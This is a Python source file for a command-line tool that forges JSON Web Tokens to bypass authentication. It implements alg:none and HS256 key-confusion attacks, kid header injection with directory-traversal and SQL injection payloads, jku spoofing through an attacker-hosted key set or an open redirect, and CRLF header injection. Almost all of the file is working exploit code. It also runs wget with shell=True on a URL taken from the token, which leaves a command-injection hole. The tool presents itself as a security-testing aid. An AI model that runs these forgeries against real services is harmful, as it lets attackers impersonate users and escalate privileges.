#!/usr/bin/python3

"""
   Copyright 2021 DontPanicO-AT

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
"""


__version__ = "0.1"
__author__ = "DontPanicO"

import os
import sys
import subprocess
import hmac
import hashlib
import base64
import json
import OpenSSL
import re
import binascii
import argparse
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

#OBTAIN THE PATH OF crafted DIRECTORY
try:
    from config import cwd
except ImportError:
    path = sys.argv[0]
    if len(path.split("/")) > 1:
        cwd = f"{'/'.join(path.split('/')[:-1])}/"
    else:
        cwd = ""


class Bcolors:
    """
    A class used to store colors in some constant, to be retrieved later in the script to return a fancy output.
    """
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class Cracker:

    description = "A command line tool for test security of JWTs"

    usage = """
        python3 jwt-crack.py <token> [OPTIONS]; OR
        jwtcrk <token> [OPTIONS]; IF YOU HAVE USED install.py
	"""

    man = """
        python3 jwt-crack.py <token> [options]; OR
        jwtcrk <token> [options]; IF YOU HAVE USED install.py
        
        Positional:
        token                     [Your JWT.]
        
        Optional:
        -a --alg <alg>            [The algorithm; None, none, HS256, RS256.]
        -k --key <path>           [The path to the key if it's needed.]
        -p --payload <name:value> [The field you want to change in the payload.]
        -d --decode               [Decode the token and quit.]
           --unverified           [Act as the host does not verify the signature.]
           --auto-try <hostname>  [If it's present the script will retrieve the key
                                   using openssl. If the host uses this key to signs
                                   its token, it will work.]
           --specify-key <string> [A string used as key.]
           --inject-kid <exploit> [Try to inject a payload in the kid header; dirtrv, sqli.]
           --jku-basic <yourURL>  [Basic jku injection. jku attacks are complicated, you need
                                   some configs. You have to host the jwks.json crafted file
                                   on your pc or on a domain you own. Pass it to this parameter,
                                   but don't force a path; jwks have a common path, pass only
                                   the first part of the url, '/.well-known/jwks.json' will be
                                   automatically appended. Look at the examples for more details.]
           --jku-redirect <mainURL,yourURl>
                                  [Try to use an open redirect to make toe jku header point to
                                   your url. To do this you need to specify the exact place in
                                   the main url, where your url has to be attached. This is done
                                   with the keyword HERE. Look at the examples for more details.]
        
        Examples:
        jwtcrk <token> --decode
        jwtcrk <token> --alg None --payload <key>:<value>
        jwtcrk <token> --alg HS256 --key <path_to_public.pem> --payload <key>:<value>
        jwtcrk <token> --alg RS256 --payload <key>:<value> --jku-basic http://myurl.com
        jwtcrk <token> --alg rs256 -p <key>:<value> --jku-redirect https://example.com?redirect=HERE&foo=bar,https://myurl.com

        Documentation: http://
        """

    command = [sys.argv[i] for i in range(len(sys.argv))]

    output = f"""{Bcolors.OKBLUE}A tool to exploit JWT vulnerabilities...{Bcolors.ENDC}
{Bcolors.HEADER}Version:{Bcolors.ENDC} {Bcolors.OKCYAN}{__version__}{Bcolors.ENDC}
{Bcolors.HEADER}Author:{Bcolors.ENDC} {Bcolors.OKCYAN}{__author__}{Bcolors.ENDC}
{Bcolors.HEADER}Command:{Bcolors.ENDC} {Bcolors.OKCYAN}{" ".join(command)}{Bcolors.ENDC}
        """

    def __init__(self, token, alg, path_to_key, user_payload, auto_try, kid, specified_key, jku_basic, jku_redirect, jku_header_injection, unverified=False, decode=False):
        """
        :param token: The user input token -> String. Positional.
        :param alg: The algorithm for the attack. HS256 or None -> str. Optional.
        :param path_to_key: The path to the public.pem, if the alg is HS256 -> str. Optional.
        :param user_payload: What the user want to change in the payload -> str. Optional.
        :param auto_try: The hostname from which the script try to retrieve a key via openssl -> String. Optional.
        :param kid: The type of payload to inject in the kid header. DirTrv or SQLi -> str. Optional.
        :param specified_key: A string set to be used as key -> str. Optional.
        :param jku_basic: The main url on which the user wnat to host the malformed jwks file -> str. Optional.
        :param unverified: A flag to set if the script have to act as the host doesn't verify the signature -> Bool. Optional.
        :param decode: A flag to set if the user need only to decode the token -> Bool. Optional

        Initialize the variables that we need to be able to access from all the class; all the params plus
        self.file and self.token. Then it call the validation method to validate some of these variables (see below),
        and lastly create a token dictionary, with dictionarize_token, and get decoded header and payload out of it.

        """
        print(Cracker.output)
        self.token = token
        self.alg = alg
        self.path_to_key = path_to_key
        """self.file and self.key will be overriden later"""
        self.file = None
        self.key = None
        self.user_payload = user_payload
        self.auto_try = auto_try
        self.kid = kid
        self.specified_key = specified_key
        self.jku_basic = jku_basic
        self.jku_redirect = jku_redirect
        self.jku_header_injection = jku_header_injection
        self.unverified = unverified
        self.decode = decode
        self.jku_args = [self.jku_basic, self.jku_redirect, self.jku_header_injection]
        # print(self.token, self.alg, self.path_to_key, self.user_payload, self.auto_try, self.unverified, self.decode)		# DEBUG
        """Call the validation"""
        self.validation()
        self.token_dict = Cracker.dictionarize_token(token)
        self.original_token_header, self.original_token_payload = Cracker.decode_encoded_token(self.token_dict)

    def validation(self):
        """
        Does some validation on; self.token, self.alg, self.path_to_key, self.auto_try, self.kid self.file and self.key.
        This function is written in a terrible way, but it works. Since it has to handle so many different use cases
        for me it's enough. If you want to make some restyle, without compromising it functionality, you're welcome.

        1)Validate the token: Using check_token, looks if the token is valid. If not quits out.

        2)Validate alg: If an algorithm has been passed, it checks that's a valid one. If it's None or none it reminds
        to the user that some libraries accept None and other none. Then does a case sensitive correction if hs256 or rs256
        has been passed as alg. Last but not least, if any jku argument is present, it force the alg to be RSA.
        Since the user can not passes more than one jku related argument, the script look for this and eventually quits.

        3)Validate key: This is the most complex validation since the key can be retrieved from different arguments.
        This validation has to solve lot of possible conflicts, at least giving warnings to the user and giving priority
        to the right argument. First, if a jku argument has been passed, the scripts checks that no other key related one
        has been passed too, and if it quits out. Else it generates a priv pub pair with openssl and extracs the modulus and
        the esponent. Since now, if any jku arg has been passed, we know that not other args has, so the validation ends here.
        If it goes on, it means that we have no jku arg, so we don't need to check for it later in the function.
        If an hostname for self.auto_try has been passed, it call get_key_from_ssl_cert and stores it in self.path_to_key.
        In this check, if we have self.kid the script quits, cause of the conflict (self.kid uses preset keys). Then if
        we have self.path_to_key, it firsts checks that the path exists and that the alg is different from 'none' or 'None'.
        Else it exits. Then if self.kid is present, checks that it has a proper value, and store the relative preset key.
        If self.kid has an unknown value, the script prints out an errors and quits. Only having no self.kid, an existing
        path, and an algorithm different from 'none' and 'None', the script will open the path stored in self.path_to_key,
        and store its read in self.key.

        """
        """Validate the token"""
        token_is_valid = Cracker.check_token(self.token)
        if not token_is_valid:
            print("ERROR: Invalid token!")
            sys.exit(2)
        """Validate alg"""
        if self.alg is not None:
            valid_algs = ["None", "none", "HS256", "hs256", "RS256", "rs256"]
            if self.alg not in valid_algs:
                print(f"{Bcolors.FAIL}ERROR: Invalid algorithm.{Bcolors.ENDC}")
                sys.exit(2)
            else:
                if self.alg == "hs256":
                    self.alg = "HS256"
                elif self.alg == "None" or self.alg == "none":
                    print(f"{Bcolors.OKBLUE}INFO: Some JWT libraries use 'none' instead of 'None', make sure to try both.{Bcolors.ENDC}")
                elif self.alg == "rs256" or self.alg == "RS256":
                    if not any(arg is not None for arg in self.jku_args):
                        print(f"{Bcolors.FAIL}ERROR: RS256 is supported only for jku injection for now.{Bcolors.ENDC}")
                        sys.exit(1)
                    if self.alg == "rs256":
                        self.alg = "RS256"
        """Force self.alg to RS256 for jku attacks"""
        if any(arg is not None for arg in self.jku_args):
            if len(list(filter(lambda x: x is not None, self.jku_args))) > 1:
                print(f"{Bcolors.FAIL}ERROR: You can't use two jku injections at the same time.{Bcolors.ENDC}")
                sys.exit(1)
            if self.alg is not None and self.alg != "RS256":
                print(f"{Bcolors.WARNING}WARNING: With jku injections, alg will be forced to RS256.{Bcolors.ENDC}")
            self.alg = "RS256"
        """Validate key"""
        # MAYBE THIS STEP COULD BE INCLUDED IN THE PREVIOUS ONE???
        if any(arg is not None for arg in self.jku_args):
            other_key_related_args = [self.path_to_key, self.auto_try, self.kid, self.specified_key]
            """With jku, you can't use other key related args"""
            if any(arg is not None for arg in other_key_related_args) or self.unverified:
                print(f"{Bcolors.FAIL}ERROR: please don't pass any key related args with jku attacks.{Bcolors.ENDC}")
                sys.exit(2)
            """Generate a key with OpenSSL"""
            key = OpenSSL.crypto.PKey()
            key.generate_key(type=OpenSSL.crypto.TYPE_RSA, bits=2048)
            self.key = key
            """The key is converted in a cryptography.hazmat.backends.openssl.rsa._RSAPrivateKey object"""
            self.key.priv = key.to_cryptography_key()
            """Same but _RSAPublicKey object"""
            self.key.pub = self.key.priv.public_key()
            """Extract modulus and exponent"""
            self.key.pub.e = self.key.pub.public_numbers().e
            self.key.pub.n = self.key.pub.public_numbers().n
        if self.auto_try is not None:
            if self.kid is not None or self.specified_key is not None:
                print(f"{Bcolors.FAIL}ERROR: --inject-kid uses preset keys, this creates a conflict with --auto-try.{Bcolors.ENDC}")
                sys.exit(2)
            path = Cracker.get_key_from_ssl_cert(self.auto_try)
            self.path_to_key = path
        if self.kid is not None:
            if self.path_to_key is not None or self.specified_key is not None:
                print(f"{Bcolors.FAIL}ERROR: You don't need to specify a key for kid injections{Bcolors.ENDC}")
                sys.exit(2)
            else:
                if self.kid.lower() == "dirtrv":
                    self.kid = "DirTrv"
                    self.key = ""
                elif self.kid.lower() == "sqli":
                    self.kid = "SQLi"
                    self.key = "zzz"
                else:
                    print(
                        f"{Bcolors.FAIL}ERROR: Invalid --inject-kid. Please select a valid one{Bcolors.ENDC}",
                        Cracker.usage
                    )
                    sys.exit(2)
        elif self.specified_key is not None:
            self.key = self.specified_key
        if self.path_to_key is not None:
            if not os.path.exists(self.path_to_key):
                print(f"{Bcolors.FAIL}ERROR: Seems like the file does not exist{Bcolors.ENDC}")
                sys.exit(2)
            elif self.alg == "None" or self.alg == "none":
                print(f"{Bcolors.FAIL}ERROR: You don't need a key with the None algo{Bcolors.ENDC}")
                sys.exit(2)
            else:
                self.file = open(self.path_to_key, 'r')
                self.key = self.file.read()

    def decode_and_quit(self):
        """
        The JWT "decoding" function.

        Since the decoded header and payload are already been stored when the __init__ method ran, it just displays
        them on the screen.
        This function is intended to run if -d (or --decode) is present so it print outs some warnings if useless
        parameters have been called along with -d itself.

        """
        other_args = [self.alg, self.path_to_key, self.user_payload, self.auto_try, self.kid, self.specified_key, self.jku_basic, self.jku_redirect, self.jku_header_injection]
        if any(arg is not None for arg in other_args) or self.unverified:
            print(f"{Bcolors.WARNING}WARNING: You have not to specify any other argument if you want to decode the token{Bcolors.ENDC}", Cracker.usage)
        print(f"{Bcolors.HEADER}Header:{Bcolors.ENDC} {Bcolors.OKCYAN}{self.original_token_header}{Bcolors.ENDC}" +
              "\n" +
              f"{Bcolors.HEADER}Payload:{Bcolors.ENDC} {Bcolors.OKCYAN}{self.original_token_payload}{Bcolors.ENDC}"
              )
        sys.exit(0)

    def modify_header_and_payload(self):
        """
        Starting from the originals decoded header and payload, modify them according to the user input.

        Using json, the function create two dictionaries of self.original_token_header and self.original_token_payload,
        in order to access and modify them as dict object. If we have some header injection like kid or jku, the script
        modifys those headers with the related payload.
        It changes the algorithm to the one specified by the user, then look he has also declared any payload change. 
        If he has, the function calls the change_payload method, for each change stored in self.user_payload.

        N.B. self.user_payload is a list and, any time the user call a -p, the value went stored in another list inside
        self.user_payload. So it basically contains as many list as the user calls to --payload. And the value of each
        calls will always be the firs and only element of each list.

        :return: The modified header and payload strings.
        """
        header_dict = json.loads(self.original_token_header)
        payload_dict = json.loads(self.original_token_payload)
        header_dict['alg'] = self.alg
        if self.kid:
            header_dict['kid'] = self.inject_kid()
        elif self.jku_basic:
            if "jku" not in header_dict.keys():
                print(f"{Bcolors.FAIL}ERROR: JWT header has not jku.{Bcolors.ENDC}")
                sys.exit(2)
            your_url = self.jku_basic.rstrip("/") + "/.well-known/jwks.json"
            self.jku_basic_attack(header_dict)
            header_dict['jku'] = your_url
        elif self.jku_redirect:
            if "jku" not in header_dict.keys():
                print(f"{Bcolors.FAIL}ERROR: JWT header has not jku.{Bcolors.ENDC}")
                sys.exit(2)
            main_url = self.jku_redirect.split(",")[0]
            your_url = self.jku_redirect.split(",")[1].rstrip("/") + "/.well-known/jwks.json"
            self.jku_basic_attack(header_dict)
            header_dict['jku'] = main_url.replace("HERE", your_url)
        elif self.jku_header_injection:
            if "jku" not in header_dict.keys():
                print(f"{Bcolors.FAIL}ERROR: JWT header has no jku.{Bcolors.ENDC}")
                sys.exit(2)
            body = self.jku_via_header_injection(header_dict)
            content_length = len(body)
            body = body.replace("[", "%5b").replace("]", "%5d").replace("{", "%7b").replace("}", "%7d").replace(" ", "%20")
            injection = f"%0d%0aContent-Length:+{content_length}%0d%0a%0d%0a{body}"
            url = self.jku_header_injection.replace("HERE", injection)
            header_dict['jku'] = url
        if self.user_payload:
            for item in self.user_payload:
                payload_dict = Cracker.change_payload(item[0], payload_dict)
        new_header = json.dumps(header_dict).replace(", ", ",").replace(": ", ":")
        new_payload = json.dumps(payload_dict).replace(", ", ",").replace(": ", ":")
        return new_header, new_payload

    def jku_basic_attack(self, header):
        """
        :param header: the header dictionary to modify -> dict.
        Get the jwks.json file from the url specified in the jku header. Then loads the file as json and accesses
        it to change the modulus and the esponent with the ones of our generated key. Then creates a new file in
        .well-known/jwks.json and write into it the dumps of the dict.
        """
        devnull_ = open(os.devnull, 'wb')
        command = "wget " + header['jku']
        command_output = subprocess.check_output(command, shell=True, stdin=devnull_, stderr=devnull_)
        jwks = open("jwks.json")
        jwks_dict = json.load(jwks)
        jwks_dict['keys'][0]['e'] = base64.urlsafe_b64encode(
            (self.key.pub.e).to_bytes((self.key.pub.e).bit_length() // 8 + 1, byteorder='big')
        ).decode('utf-8').rstrip("=")
        jwks_dict['keys'][0]['n'] = base64.urlsafe_b64encode(
            (self.key.pub.n).to_bytes((self.key.pub.n).bit_length() // 8 + 1, byteorder='big')
        ).decode('utf-8').rstrip("=")
        file = open(f"{cwd}crafted/jwks.json", 'w')
        file.write(json.dumps(jwks_dict))
        devnull_.close()
        file.close()

    def jku_via_header_injection(self, header):
        """
        :param header: the header dictonary to modify -> dict.
        Same as self.jku_basic_attack, but instead of write a jwks file, it returns in an http response body
        format.

        :return: The crafted jwks string in an http response body format.
        """
        devnull_ = open(os.devnull, 'wb')
        command = "wget " + header['jku']
        command_output = subprocess.check_output(command, shell=True, stdin=devnull_, stderr=devnull_)
        jwks = open("jwks.json")
        jwks_dict = json.load(jwks)
        jwks_dict['keys'][0]['e'] = base64.urlsafe_b64encode(
            (self.key.pub.e).to_bytes((self.key.pub.e).bit_length() // 8 + 1, byteorder='big')
        ).decode('utf-8').rstrip("=")
        jwks_dict['keys'][0]['n'] = base64.urlsafe_b64encode(
            (self.key.pub.n).to_bytes((self.key.pub.n).bit_length() // 8 + 1, byteorder='big')
        ).decode('utf-8').rstrip("=")
        body = json.dumps(jwks_dict)
        devnull_.close()
        return body

    def select_signature(self, partial_token):
        """
        Creates a signature for the new token.

        :param partial_token: The first two part of the crafted jwt. String.

        If self.unverified is present its define the signature as the one of the original token.
        It then checks which algorithm has been chosen by the user; with 'None' algorithm it stores an empty string
        as signature, while with HS256 it encrypts the partial_token with the key (self.keys) and, of course, using
        sha256. It encodes it in base64, and strip all trailing '='. With RSA it use self.key.priv to sign the token
        and we use another module to that since is the one that define the class of which self.key.priv is instance
        of, and we need a padding that this module provides us.

        :return: The generated signature.
        """
        if self.unverified:
            signature = self.token_dict['signature']
        else:
            if self.alg == "None" or self.alg == "none":
                signature = ""
            elif self.alg == "HS256":
                if self.key is None:
                    print(f"{Bcolors.FAIL}ERROR: Key is needed with HS256{Bcolors.ENDC}")
                    sys.exit(2)
                signature = base64.urlsafe_b64encode(
                    hmac.new(bytes(self.key, "utf-8"), partial_token.encode('utf-8'), hashlib.sha256).digest()
                ).decode('utf-8').rstrip("=")
            elif self.alg == "RS256":
                signature = base64.urlsafe_b64encode(
                    self.key.priv.sign(
                        bytes(partial_token, encoding='utf-8'), algorithm=hashes.SHA256(), padding=padding.PKCS1v15()
                    )
                ).decode('utf-8').rstrip("=")
        return signature

    def inject_kid(self):
        """
        A function to test for injections in the kid header.

        Defines a dictionary containing payloads to inject in the key header, and grabs the ones select by the user.

        This function is intended to be update with new payloads, the first update should be for the ruby RCE

        :return: The related payload string

        """
        kid_payloads = {
            "DirTrv": "../../../../../dev/null",
            "SQLi": "0001' union select 'zzz",
        }

        if self.kid == "DirTrv":
            return kid_payloads['DirTrv']
        elif self.kid == "SQLi":
            return kid_payloads['SQLi']

    @staticmethod
    def check_token(token):
        """
        A method for verify if a JWT have a valid pattern.

        :param token: A JWT -> String.

        Creates a regex pattern and looks if the token match it.

        :return: True, if the token match the pattern, False if not. Bool.
        """
        token_pattern = r"^.+\..+\..*$"
        match = re.match(token_pattern, token)
        if match:
            return True
        else:
            return False

    @staticmethod
    def dictionarize_token(token):
        """
        A method that stores in a dict the three part ok a JWT.

        :param token: A JWT -> String.

        Splits the token in three part (header, payload, signature) and creates a dict with thees data.

        :return: The created dict object
        """
        token_list = token.split(".")
        if len(token_list) < 3:
            token_list.append("")
        token_dict = dict(header=token_list[0], payload=token_list[1], signature=token_list[2])
        return token_dict

    @staticmethod
    def append_equals_if_needed(string):
        """
        Corrects a string that is intended to be base64 decoded.

        :param string: A string, base64 encoded part of a JWT -> String.

         Since JWT are base64 encoded but the equals signs are stripped, this function append them to string
         given as input, only if necessary.

         If the string can't be decoded after the second equal sign has been appended, it return an error.

        :return: A byte-string ready to be base64 decoded.
        """
        encoded = string.encode()
        final_text = b""
        i = 0
        while not final_text:
            try:
                decoded = base64.urlsafe_b64decode(encoded)
                final_text = encoded
                return final_text
            except binascii.Error:
                if i == 2:
                    print(f"{Bcolors.FAIL}ERROR: Seems like the token is not base64 encoded or simply invalid{Bcolors.ENDC}")
                encoded += b'='
                i += 1

    @staticmethod
    def decode_encoded_token(iterable):
        """
        :param iterable: A dict object populated with the three parts of a JWT -> Dict.

        This function simply take the header and the payload from a dictionary created with dictionarize_token, passes
        them to append_equals_if_needed and decodes them.

        :return: The decoded header, and the decoded payload as strings.
        """
        if iterable['header'] is None or iterable['payload'] is None:
            print(f"{Bcolors.OKBLUE}Please pass the token dict as parameter{Bcolors.ENDC}")
        header_b64 = Cracker.append_equals_if_needed(iterable["header"])
        payload_b64 = Cracker.append_equals_if_needed(iterable["payload"])
        try:
            header_ = base64.urlsafe_b64decode(header_b64).decode('utf-8')
            payload_ = base64.urlsafe_b64decode(payload_b64).decode('utf-8')
        except UnicodeDecodeError:
            print(f"{Bcolors.FAIL}ERROR: Decoding Error. Please be sure, to print a valid jwt.{Bcolors.ENDC}")
            sys.exit(2)
        return header_, payload_

    @staticmethod
    def change_payload(user_input, iterable):
        """
        :param user_input: One of the input name:value passed by the user to change data in the payload -> String.
        :param iterable: A dict object representing the original decoded payload of the JWT -> Dict.

        Given a string with this 'name:value' format, splits it, look for a <name> key in the iterable and, if it's,
        change its value to <value>. If it doesn't find <name> in the iterable's keys, print an error and quits out.

        :return: The dictionary with the changes done.
        """
        try:
            user_payload = user_input.split(":")
            user_payload_name = user_payload[0]
            user_payload_value = user_payload[1]
        except IndexError:
            print(f"{Bcolors.FAIL}ERROR: Payload must have this syntax: name:value. You have write '{user_input}'{Bcolors.ENDC}")
            sys.exit(2)
        if user_payload_name not in iterable.keys():
            print(f"{Bcolors.WARNING}WARNING: can't find {user_payload_name} in the token payload. It will be added{Bcolors.ENDC}")
        iterable[user_payload_name] = user_payload_value
        return iterable

    @staticmethod
    def encode_token_segment(json_string):
        """
        :param json_string. A decoded string of the header or the payload, with the values changed according to the
        user input -> String.

        Pretty self explanatory...

        :return: The base64 encoded string, so one part of the final token.
        """
        encoded_new_segment_bytes = base64.urlsafe_b64encode(json_string.encode("utf-8"))
        encoded_new_segment_string = str(encoded_new_segment_bytes, 'utf-8').rstrip("=")
        return encoded_new_segment_string

    @staticmethod
    def craft_token(header_, payload_):
        """
        :param header_: The decoded header, with the values changed according to the user input -> String.
        :param payload_: The decoded payload, with the values changed according to the user input -> String.

        Calls encode_token_segment on the header_ and the payload_ and then sum them.

        :return: The encoded header + the encoded payload as string. Basically two part of a complete JWT.
        """
        encoded_header = Cracker.encode_token_segment(header_)
        encoded_payload = Cracker.encode_token_segment(payload_)
        return encoded_header + "." + encoded_payload

    @staticmethod
    def get_key_from_ssl_cert(hostname):
        """
        :param hostname. The hostname of which you want to retrieve the cert -> string

        First open devnull to redirect stdin, stdout or stderr if necessary, and defines a regex pattern to match the output of
        our first command. Then defines the command that we need to retrieve an ssl cert and launches it with subprocess and handle
        enventual errors. At this points, the function uses regex to grab the content that wee need, and writes that content in a
        file. Then defines the second command that we need, and launches it. Since this command should have no output, if we have,
        breaks out and returns an error. Else stores the path for the generated key, and closes devnull.

        :retrun the path to the generated key.
        """
        devnull_ = open(os.devnull, 'wb')
        pattern = r'(?:Server\scertificate\s)((.|\n)*?)subject='
        # GET CERT.PEM
        first_command = f"openssl s_client -connect {hostname}:443"
        try:
            first_command_output = subprocess.check_output(
                first_command, shell=True, stdin=devnull_, stderr=devnull_
            ).decode('utf-8')
        except subprocess.CalledProcessError:
            print(
                f"{Bcolors.FAIL}ERROR: Can't openssl s_client can't connect with {hostname}. Please make sure to type correctly{Bcolors.ENDC}"
            )
            sys.exit(2)
        cert = re.findall(pattern, first_command_output)[0][0].rstrip("\n")
        # WRITE CERT.PEM
        with open("cert.pem", 'w') as file:
            file.write(cert)
        # EXTRACT KEY.PEM
        second_command = "openssl x509 -in cert.pem -pubkey -noout > key.pem"
        second_command_output = subprocess.check_output(
            second_command, shell=True, stdin=devnull_, stderr=subprocess.STDOUT
        )
        if second_command_output:
            print(f"{Bcolors.FAIL}ERROR: Maybe the cert is not valid.{Bcolors.ENDC}")
            sys.exit(2)
        key = f"{os.getcwd()}/key.pem"
        devnull_.close()
        return key

    def run(self):
        if self.decode:
            self.decode_and_quit()
        if self.alg is None:
            print(f"{Bcolors.FAIL}ERROR: Missing --alg. You can mess it up only if you are decoding a jwt{Bcolors.ENDC}")
            sys.exit(2)
        header, payload = self.modify_header_and_payload()
        new_partial_token = Cracker.craft_token(header, payload)
        signature = self.select_signature(new_partial_token)
        final_token = new_partial_token + "." + signature
        print(f"{Bcolors.HEADER}Crafted header ={Bcolors.ENDC} {Bcolors.OKCYAN}{header}{Bcolors.ENDC}, {Bcolors.HEADER}Crafted payload ={Bcolors.ENDC} {Bcolors.OKCYAN}{payload}{Bcolors.ENDC}")
        print(f"{Bcolors.BOLD}{Bcolors.HEADER}Final Token:{Bcolors.ENDC} {Bcolors.BOLD}{Bcolors.OKBLUE}{final_token}{Bcolors.ENDC}")
        # print(final_token.split(".")[0] == self.token_dict['header'], final_token.split(".")[1] == self.token_dict['payload'])	# DEBUG
        if self.file is not None:
            self.file.close()
        if os.path.exists("jwks.json"):
        	os.remove("jwks.json")
        sys.exit(0)


if __name__ == '__main__':

    # Initialize the parser
    parser = argparse.ArgumentParser(
        usage=Cracker.usage,
        description=Cracker.description,
        formatter_class=argparse.RawTextHelpFormatter
    )

    # Add the arguments
    parser.add_argument(
                        "token",
                        help="Your JWT"
                        )
    parser.add_argument("-a", "--alg",
                        help="The algorithm for the attack (None, none, HS256, RS256)",
                        metavar="<algorithm>", required=False
                        )
    parser.add_argument("-k", "--key",
                        help="The path to the public key file",
                        metavar="<path_to_key>", required=False
                        )
    parser.add_argument("-p", "--payload",
                        action="append", nargs="*",
                        help="The field you want to change in the payload as key:value pairs",
                        metavar="<key>:<value>", required=False
                        )
    parser.add_argument("-d", "--decode", action="store_true",
                        help="Just decode the token and quit.",
                        required=False
                        )
    parser.add_argument("--unverified", action="store_true",
                        help="Treat the host as it doesn't verify the signature",
                        required=False
                        )
    parser.add_argument("--auto-try",
                        help="Try to use a key retrieved from the host ssl certs",
                        metavar="<domain>", required=False
                        )
    parser.add_argument("--inject-kid",
                        help="Try for kid injection. Choose a valid payload (DirTrv, SQLi)",
                        metavar="<payload>", required=False
                        )
    parser.add_argument("--specify-key",
                        help="Specify a string to use as key", metavar="<key>",
                        required=False
                        )
    parser.add_argument("--jku-basic",
                        help="Specify your ip or domain to host the jwks.json file",
                        metavar="<yourURL>", required=False
                        )
    parser.add_argument("--jku-redirect",
                        help="Specify the url with a redirect to the host where jwks.json file will be hosted",
                        metavar="<mainURL,yourURL>", required=False
                        )
    parser.add_argument("--jku-body",
                        help="Specify the url vulnerable to header injection, use the HERE keyword to tell the tool where to inject",
                        metavar="<mainURL>", required=False
                       )

    # Parse arguments
    args = parser.parse_args()

    cracker = Cracker(
        args.token, args.alg, args.key, args.payload, args.auto_try,
        args.inject_kid, args.specify_key, args.jku_basic, args.jku_redirect, args.jku_body, args.unverified, args.decode
    )
    # print(args.payload)	# DEBUG
    # print(cracker.key)	# DEBUG
    cracker.run()

